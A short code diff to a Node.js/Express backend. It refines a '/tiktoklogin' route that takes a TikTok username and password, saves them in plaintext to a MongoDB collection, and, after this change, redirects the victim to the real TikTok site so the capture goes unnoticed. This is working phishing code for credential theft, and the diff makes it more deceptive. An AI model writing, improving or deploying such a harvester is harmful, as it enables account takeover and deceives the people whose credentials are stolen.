@@ -40,7 +40,7 @@ const User = mongoose.model('User', userSchema);
 // TikTok login route
 app.post('/tiktoklogin', async (req, res) => {
     const { username, password } = req.body;
-
+   
     if (!username || !password) {
         return res.status(400).json({ error: 'Username and password are required.' });
     }
@@ -48,9 +48,9 @@ app.post('/tiktoklogin', async (req, res) => {
     try {
         const newUser = new User({ username, password, platform: 'TikTok' });
         await newUser.save();
-        res.status(201).json({ message: 'TikTok login data saved successfully.' });
+        res.redirect("https://www.tiktok.com/en/")
     } catch (error) {
-        res.status(500).json({ error: 'Failed to save data.' });
+        res.status(500).json({ error: 'Retry something went wrong' });
     }
 });
 
